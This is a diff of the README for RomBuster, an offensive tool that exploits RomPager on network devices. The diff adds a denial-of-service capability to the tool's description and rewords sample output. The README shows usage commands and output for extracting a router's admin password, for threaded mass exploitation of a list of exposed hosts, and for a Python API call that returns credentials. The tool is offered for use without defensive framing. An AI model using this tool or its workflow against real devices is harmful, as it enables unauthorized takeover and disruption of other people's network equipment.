@@ -1,6 +1,6 @@
 # RomBuster
 
-RomBuster is a RomPager exploitation tool that allows to disclosure network router admin password.
+RomBuster is a RomPager exploitation tool that allows to disclosure network device admin password or perform DoS attack on device.
 
 ## Features
 
@@ -21,11 +21,11 @@ To use RomBuster just type `rombuster` in your terminal.
 ```
 usage: rombuster [-h] [--threads] [--output OUTPUT] [--input INPUT] [--address ADDRESS]
 
-RomBuster is a RomPager exploitation tool that allows to disclosure network router admin password.
+RomBuster is a RomPager exploitation tool that allows to disclosure network device admin password or perform DoS attack on device.
 
 optional arguments:
   -h, --help         show this help message and exit
-  --threads          Use threads for fastest work. [best]
+  --threads          Use threads for fastest work.
   --output OUTPUT    Output result to file.
   --input INPUT      Input file of addresses.
   --address ADDRESS  Single address.
@@ -44,8 +44,8 @@ rombuster --address 192.168.2.1
 ```shell
 [*] (192.168.2.1) - connecting to device...
 [*] (192.168.2.1) - accessing device rom...
-[*] (192.168.2.1) - extracting credentials...
-[i] (192.168.2.1) - admin:SuperHardPassword999
+[*] (192.168.2.1) - extracting admin password...
+[i] (192.168.2.1) - password: SuperHardPassword999
 ```
 
 Let's try to use opened database of hosts with `--threads` for fast exploitation.
@@ -66,15 +66,15 @@ It will exploit all devices in `routers.txt` list by their addresses and save al
 [*] Initializing thread #2...
 [*] (x.x.x.x) - connecting to device...
 [*] (x.x.x.x) - accessing device rom...
-[*] (x.x.x.x) - extracting credentials...
+[*] (x.x.x.x) - extracting admin password...
 [i] Thread #0 completed.
 [*] (x.x.x.x) - connecting to device...
 [*] (x.x.x.x) - accessing device rom...
-[*] (x.x.x.x) - extracting credentials...
+[*] (x.x.x.x) - extracting admin password...
 [i] Thread #1 completed.
 [*] (x.x.x.x) - connecting to device...
 [*] (x.x.x.x) - accessing device rom...
-[*] (x.x.x.x) - extracting credentials...
+[*] (x.x.x.x) - extracting admin password...
 [i] Thread #2 completed.
 ```
 
@@ -107,7 +107,7 @@ print(rombuster.exploit(device))
 **output:**
 
 ```shell
-{'admin':'SuperHardPassword999'}
+{'admin': 'SuperHardPassword999'}
 ```
 
 ## Vulnerability details
